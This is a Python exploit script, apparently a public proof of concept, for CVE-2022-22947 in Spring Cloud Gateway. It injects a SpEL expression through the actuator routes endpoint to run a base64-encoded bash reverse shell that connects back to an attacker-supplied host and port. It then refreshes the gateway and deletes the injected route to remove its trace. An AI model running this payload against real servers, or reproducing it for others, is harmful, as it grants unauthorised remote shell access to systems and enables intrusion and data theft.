import requests
import json
import sys
import re
import base64
import random

headers1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/json'
}

headers2 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
}

def get_shell():
	shell = "bash -i >& /dev/tcp/{}/{} 0>&1".format(reverse_ip,reverse_port)
	shellcode = "bash -c {echo,"+base64.b64encode(shell.encode('utf-8')).decode('utf-8')+"}|{base64,-d}|{bash,-i}"

	payload = '''{\r
	      "id": "userinfo",\r
	      "filters": [{\r
	        "name": "AddResponseHeader",\r
	        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String(\\"%s\\")).getInputStream()))}"}\r
	        }],\r
	      "uri": "http://example.com",\r
	      "order": 0\r
	    }'''%shellcode
	print(payload)

	re1 = requests.post(url=url + "/actuator/gateway/routes/userinfo",data=payload,headers=headers1,json=json)
	re2 = requests.post(url=url + "/actuator/gateway/refresh" ,headers=headers2)
	re3 = requests.get(url=url + "/actuator/gateway/routes/userinfo",headers=headers2)
	re4 = requests.delete(url=url + "/actuator/gateway/routes/userinfo",headers=headers2)
	re5 = requests.post(url=url + "/actuator/gateway/refresh" ,headers=headers2)

if __name__ == '__main__':

	try:
		url = sys.argv[1]
		reverse_ip = sys.argv[2]
		reverse_port = sys.argv[3]
		if len(sys.argv)!=4:
			print("参数错误，用法：python3 CVE-2022-22947-RCE.py url rhost rport")
			exit()
	except BaseException:
		pass

	get_shell()